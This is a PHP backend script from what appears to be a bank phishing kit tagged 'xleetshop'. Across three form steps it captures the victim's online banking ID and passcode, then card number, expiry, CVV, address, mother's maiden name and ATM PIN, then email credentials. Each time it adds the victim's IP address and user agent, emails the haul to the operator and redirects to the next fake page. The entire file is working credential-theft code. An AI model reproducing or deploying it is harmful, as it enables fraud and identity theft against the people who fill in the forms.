<?php
ob_start();

include 'email.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['password']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|---------icq: xleetshop------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./card.html");
	
}

else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Card Number            : ".$_POST['cn']."\n";
	$message .= "Expiration Date              : ".$_POST['date']."\n";
	$message .= "CVV              : ".$_POST['cvv']."\n";
	$message .= "Address              : ".$_POST['add']."\n";
	$message .= "MMN              : ".$_POST['mmn']."\n";
	$message .= "ATM Pin              : ".$_POST['pin']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------icq: xleetshop------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./em.html");
	
}

else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['aii']."\n";
	$message .= "Email Passcode              : ".$_POST['prr']."\n";
	

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------------icq: xleetshop--------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: bhgjkujyhtgrfeds.html");
	
}
ob_end_flush();
?>